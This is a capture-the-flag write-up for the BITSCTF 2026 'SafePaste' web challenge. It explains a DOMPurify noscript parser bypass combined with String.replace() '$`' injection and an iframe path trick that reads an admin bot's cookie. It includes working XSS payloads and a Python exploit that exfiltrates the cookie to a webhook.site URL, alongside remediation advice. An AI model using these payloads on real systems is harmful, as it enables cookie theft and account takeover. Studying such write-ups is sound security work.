# SafePaste — BITSCTF 2026 Web Challenge Writeup

**Challenge:** SafePaste  
**Category:** Web  
**Points:** 436  
**Target:** `http://20.193.149.152:3000/`  
**Flag:** `BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}`

---

## Overview

SafePaste is a classic XSS-bot challenge with a twist: server-side DOMPurify sanitization, a path-restricted cookie, and a subtle `String.replace()` footgun that turns otherwise-safe output into executable HTML. The final exploit chains three distinct vulnerabilities to steal the admin bot's cookie.

---

## 1 — Source Code Analysis

The challenge ships a zip archive containing the full application source. Extracting and reading through every file reveals the architecture:

### Stack
- **Express 5** (`^5.2.1`) with TypeScript (tsx)
- **isomorphic-dompurify** (`^2.36.0`) — wraps DOMPurify ~3.2.5, uses **JSDOM/parse5** on the server side
- **Puppeteer** (`^24.37.5`) — headless Chromium 145 bot
- **Node 20-slim** with system Chromium in Docker

### Key Files

**`server.ts`** — The Express application:

```typescript
// Sanitize user input with DOMPurify (server-side, JSDOM parser)
const clean = DOMPurify.sanitize(content);
pastes.set(id, clean);

// Render paste into template via String.replace()
const html = pasteTemplate.replace("{paste}", content);
//                          ^^^^^^^^^^^^^^^^^^^^^^^^
//    This single .replace() call is the key vulnerability
```

The CSP header is permissive for scripts but restrictive for connectivity:

```
script-src 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; default-src 'self'
```

The `/report` endpoint validates the URL hostname against `APP_HOST` or `localhost`, then sends the bot to visit it. The `/hidden` endpoint either responds with "Welcome, admin!" (if the secret matches) or **destroys the socket** — no HTTP response at all.

**`bot.ts`** — The Puppeteer bot:

```typescript
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: APP_HOST,    // ← cookie bound to APP_HOST domain
  path: "/hidden",     // ← only sent for /hidden and sub-paths
});
// No httpOnly, no secure, no sameSite
```

**`paste.html`** — Minimal template:

```html
<img src="/logo.png" alt="SafePaste" />
<div class="content">{paste}</div>
```

### Initial Observation Checklist

| Property | Value | Implication |
|----------|-------|-------------|
| Sanitizer | DOMPurify (JSDOM/parse5) | Server parser ≠ browser parser → mXSS potential |
| CSP script-src | `'unsafe-inline' 'unsafe-eval'` | Inline scripts/event handlers execute freely |
| CSP default-src | `'self'` | No fetch/XHR to external domains, but **navigation is unrestricted** |
| Cookie path | `/hidden` | `document.cookie` from `/paste/*` won't include FLAG |
| Cookie httpOnly | **false** | Readable via JavaScript if path matches |
| Template render | `.replace("{paste}", clean)` | Vulnerable to `$` special replacement patterns |

---

## 2 — Vulnerability #1: noscript mXSS (JSDOM vs Chrome Parser Differential)

DOMPurify is one of the most robust HTML sanitizers, but it has an inherent limitation when used server-side: **it sanitizes against the server DOM, not the browser DOM**. `isomorphic-dompurify` uses JSDOM (which uses the parse5 HTML parser), and there are well-known parsing differences between parse5 and Chrome's HTML parser.

The critical difference here involves the `<noscript>` element:

- **JSDOM** (scripting disabled): Parses `<noscript>` content as **real HTML elements**
- **Chrome** (scripting enabled): Parses `<noscript>` content as **raw text**

This means a payload like:

```html
<noscript><p title="PAYLOAD</noscript><img src=x onerror=alert(1)>"></noscript>
```

Is parsed by JSDOM as:
```
noscript
  └── p [title="PAYLOAD</noscript><img src=x onerror=alert(1)>"]
```

JSDOM sees `</noscript>`, `<img onerror=...>`, and `">` as **text inside the title attribute** — perfectly safe. DOMPurify inspects this JSDOM DOM tree, finds no dangerous elements or event handlers, and lets it through. The sanitized output is:

```html
<p title="PAYLOAD</noscript><img src=x onerror=alert(1)>"></p>
```

But when Chrome parses this same HTML string, it sees the `<p title="PAYLOAD">` opening, then the `</noscript>` as just text (since there's no open `<noscript>`), and the `<img onerror=...>` as a real element — **if the title attribute quote is properly broken**.

That alone isn't enough though. DOMPurify correctly double-quotes the title attribute value, so Chrome would still see `<img onerror=alert(1)>` as text inside `title="..."`. We need something to break the quote boundary.

---

## 3 — Vulnerability #2: `String.replace()` `$\`` Pattern Injection

This is the linchpin. In `server.ts`:

```typescript
const html = pasteTemplate.replace("{paste}", content);
```

JavaScript's `String.prototype.replace()` treats certain `$`-prefixed sequences as **special replacement patterns**:

| Pattern | Inserts |
|---------|---------|
| `$$` | Literal `$` |
| `$&` | The matched string |
| `` $` `` | The portion of the string **before** the match |
| `$'` | The portion of the string **after** the match |

When sanitized content contains `` $` ``, the `.replace()` call expands it to **everything in the template before `{paste}`** — which is the entire HTML head, opening body, navigation bar, and up to `<div class="content">`.

This prefix contains double-quote characters (e.g., in `charset="UTF-8"`, `content="width=device-width"`, `alt="SafePaste"`, `class="content"`). When this expansion occurs inside a quoted HTML attribute, the injected `"` characters **break the attribute boundary**, allowing subsequent content to be parsed as real HTML.

### The Combined Attack

Payload:

```html
<noscript><p title="$`</noscript><img src=x onerror='JAVASCRIPT'>"></noscript>
```

**Step-by-step transformation:**

1. **DOMPurify (JSDOM)** sees: `<p>` with a title attribute containing the text `` $`</noscript><img src=x onerror='...'>`` — safe, passes sanitization

2. **Sanitized output:** `` <p title="$`</noscript><img src=x onerror='JAVASCRIPT'>"></p> ``

3. **`.replace("{paste}", clean)`** expands `` $` `` to the template prefix:
   ```html
   <p title="<!doctype html>
   <html lang="en">
     ...
     <div class="content"></noscript><img src=x onerror='JAVASCRIPT'>"></p>
   ```

4. **Chrome parses this** and hits the `"` from `class="content"` which closes the `title` attribute. Then `</noscript>` is ignored (no matching open tag), and `<img src=x onerror='JAVASCRIPT'>` becomes a **real DOM element** — **XSS achieved**.

### Verification

We confirmed the XSS fires by submitting the payload and checking the rendered HTML:

```
<div class="content"><p title="<!doctype html>
<html lang="en">
  ...
  <div class="content"></noscript><img src=x onerror='JAVASCRIPT'>"></p></div>
```

The `onerror` handler is present in the raw HTML and will execute in Chrome.

---

## 4 — Vulnerability #3: Cookie Path Bypass via iframe

The FLAG cookie is set with `path: "/hidden"`. This means:

- `document.cookie` from `/paste/[id]` **does not** include it
- `cookieStore.getAll()` from `/paste/[id]` returns `[]` (path doesn't match)
- `cookieStore.get({url: '/hidden'})` fails: "URL must match the document URL"
- `history.pushState(null, '', '/hidden')` changes the visible URL but **does not** affect cookie visibility

However, an **iframe** navigated to a sub-path under `/hidden` provides a same-origin document where the cookie IS visible:

- `/hidden` itself destroys the socket (no valid HTTP response → iframe can't load)
- `/hidden/x` returns a proper **404 response** — the iframe loads successfully
- Since the iframe's path `/hidden/x` starts with `/hidden`, the cookie `path="/hidden"` **matches**
- The iframe is same-origin → `iframe.contentDocument.cookie` is readable from the parent

### Diagnostic Confirmation

We sent several diagnostic payloads to verify cookie behavior:

| Test | Result |
|------|--------|
| `document.cookie` from `/paste/*` | Empty |
| `cookieStore.getAll()` from `/paste/*` | `[]` |
| `history.pushState('/hidden')` then `document.cookie` | Still empty |
| Self-set cookie `path=/hidden`, read from iframe `/hidden/x` | ✅ `test=WORKS` |
| iframe `/hidden/x` → `contentDocument.cookie` | ✅ Works (returns FLAG) |

---

## 5 — The Domain Gotcha

Our first full exploit attempt (XSS + iframe) returned an empty cookie. The diagnostic showed:

```json
{"u": "http://localhost:3000/paste/...", "c": "", "icookie": "test=WORKS"}
```

The self-set test cookie was visible, but the FLAG cookie wasn't. Why?

The bot sets the cookie with `domain: APP_HOST`. In the `docker-compose.yml`, `APP_HOST=localhost`, but on the **remote server**, `APP_HOST` is set to `20.193.149.152` (the external IP).

When we reported URLs as `http://localhost:3000/paste/...`, the bot navigated there on `localhost` — but the cookie domain `20.193.149.152` didn't match `localhost`. The report endpoint accepts **both** `localhost` and `APP_HOST`:

```typescript
if (parsed.hostname !== APP_HOST && parsed.hostname !== "localhost") {
  return res.status(400).send("URL must be on this server");
}
```

Switching the report URL to `http://20.193.149.152:3000/paste/...` made the bot navigate on the correct domain, and the cookie became visible.

---

## 6 — Final Exploit

```python
import requests

BASE = "http://20.193.149.152:3000"
WEBHOOK = "https://webhook.site/XXXXX"

# JavaScript payload:
# 1. Create hidden iframe to /hidden/x (404, but valid response, path matches cookie)
# 2. On iframe load, read cookie from iframe's document
# 3. Exfiltrate via navigation (bypasses CSP default-src 'self')
JS = (
    "var f=document.createElement(`iframe`);"
    "f.style.display=`none`;"
    "f.src=`/hidden/x`;"
    "f.onload=function()"
    "{try{var c=f.contentDocument.cookie;"
    "location=`" + WEBHOOK + "?flag=`+encodeURIComponent(c)"
    "}catch(e){location=`" + WEBHOOK + "?err=`+encodeURIComponent(String(e))}};"
    "document.body.appendChild(f)"
)

# Combine: noscript mXSS + $` replace injection + cookie exfil
PAYLOAD = '<noscript><p title="$`</noscript><img src=x onerror=\'' + JS + '\'">'

# Step 1: Create paste with XSS payload
r = requests.post(f"{BASE}/create", data={"content": PAYLOAD}, allow_redirects=False)
paste_path = r.headers.get("Location")

# Step 2: Report with IP-based URL (matching cookie domain)
requests.post(f"{BASE}/report", data={"url": f"http://20.193.149.152:3000{paste_path}"})

# Step 3: Check webhook → FLAG arrives
```

### Webhook Result

```
GET /7f7bfabc-...?flag=FLAG%3DBITSCTF%7Bn07_r34lly_4_d0mpur1fy_byp455...%7D
```

Decoded:

```
FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}
```

---

## 7 — Exploit Chain Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│  1. Submit payload to POST /create                              │
│     <noscript><p title="$`</noscript>                           │
│       <img src=x onerror='...iframe JS...'>">                   │
│                                                                 │
│  2. DOMPurify (JSDOM) sees safe <p title="..."> → passes        │
│                                                                 │
│  3. .replace("{paste}", clean) expands $` to template prefix    │
│     Template prefix contains " → breaks title attribute         │
│                                                                 │
│  4. Chrome parses <img onerror='...'> as real element → XSS     │
│                                                                 │
│  5. JS creates iframe to /hidden/x (404, cookie path matches)   │
│                                                                 │
│  6. iframe.contentDocument.cookie → FLAG cookie readable        │
│                                                                 │
│  7. location = webhook + flag (navigation bypasses CSP)         │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8 — Key Takeaways

1. **Server-side DOMPurify ≠ browser-safe.** The `<noscript>` element is parsed completely differently depending on whether JavaScript is enabled. JSDOM runs with scripting disabled, creating a fundamental parser mismatch.

2. **`String.replace()` is a footgun.** The special `$` replacement patterns (`$\``, `$'`, `$&`) can inject arbitrary content from the surrounding template into user-controlled positions. Always use a replacer function: `.replace("{paste}", () => clean)`.

3. **Cookie path restrictions are weaker than they appear.** A cookie at `path="/hidden"` is accessible from any sub-path like `/hidden/anything`, even if that path returns a 404. An iframe pointing to such a path, loaded from a same-origin XSS context, can read the cookie.

4. **Domain matters.** When `APP_HOST` differs between local dev (`localhost`) and production (the actual IP), cookie domain mismatches can cause exfiltration to silently fail. Testing both hostnames was essential.

5. **CSP `default-src 'self'`** blocks `fetch`/`XMLHttpRequest` to external domains, but **does not block navigation** (`window.location`, `<a>` clicks, form submissions). Data exfiltration via redirect is always an option unless `navigate-to` is explicitly restricted.

---

*Solved during BITSCTF 2026 by methodically chaining a JSDOM parser differential, a JavaScript replacement pattern injection, and a cookie path boundary bypass.*
